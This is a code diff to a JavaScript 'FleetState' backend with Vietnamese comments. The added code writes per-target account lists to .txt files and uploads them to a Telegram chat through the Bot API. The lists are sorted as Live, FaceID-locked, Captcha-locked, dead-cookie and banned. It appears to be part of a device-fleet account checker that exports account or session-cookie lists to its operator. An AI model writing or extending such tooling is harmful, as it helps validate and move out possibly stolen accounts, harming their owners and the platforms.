@@ -1159,6 +1159,43 @@ export class FleetState {
           body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: "HTML" })
         });
       } catch (e) {}
+
+      // Tự động gửi các tệp .txt phân loại (Live, FaceID, Captcha, Dead, Banned)
+      if (detailsObj && detailsObj.category_entries && typeof detailsObj.category_entries === "object") {
+        const catMap = detailsObj.category_entries;
+        const tgtClean = String(detailsObj.target || act?.target || "fleet").replace(/[^a-zA-Z0-9_-]/g, "_");
+        const docConfigs = [
+          { key: "live", prefix: "Live", emoji: "🟢", label: "tài khoản LIVE" },
+          { key: "face_lock", prefix: "FaceID", emoji: "👤", label: "tài khoản dính FaceID Lock" },
+          { key: "captcha_lock", prefix: "Captcha", emoji: "🧩", label: "tài khoản dính Captcha Lock" },
+          { key: "dead", prefix: "Dead", emoji: "💀", label: "tài khoản Cookie chết / hết hạn" },
+          { key: "banned", prefix: "Banned", emoji: "🔴", label: "tài khoản Bị Ban" },
+        ];
+
+        for (const cfg of docConfigs) {
+          const lines = Array.isArray(catMap[cfg.key]) ? catMap[cfg.key] : [];
+          if (lines.length > 0) {
+            const fileName = `${cfg.prefix}_${tgtClean}.txt`;
+            const fileContent = lines.join("\n") + "\n";
+            const caption = `${cfg.emoji} <b>Danh sách ${cfg.label}</b> (${lines.length} acc)`;
+            try {
+              if (typeof FormData !== "undefined" && typeof Blob !== "undefined") {
+                const formData = new FormData();
+                formData.append("chat_id", String(chatId));
+                formData.append("document", new Blob([fileContent], { type: "text/plain;charset=utf-8" }), fileName);
+                formData.append("caption", caption);
+                formData.append("parse_mode", "HTML");
+                await fetch(`https://api.telegram.org/bot${this.env.TELEGRAM_BOT_TOKEN}/sendDocument`, {
+                  method: "POST",
+                  body: formData
+                });
+              }
+            } catch (errDoc) {
+              console.error(`[TELEGRAM_DOC] Lỗi gửi ${fileName}:`, errDoc);
+            }
+          }
+        }
+      }
     }
 
     return json({ ok: true, action_id: actionId, device_id: deviceId, status: status || "SUCCESS" });
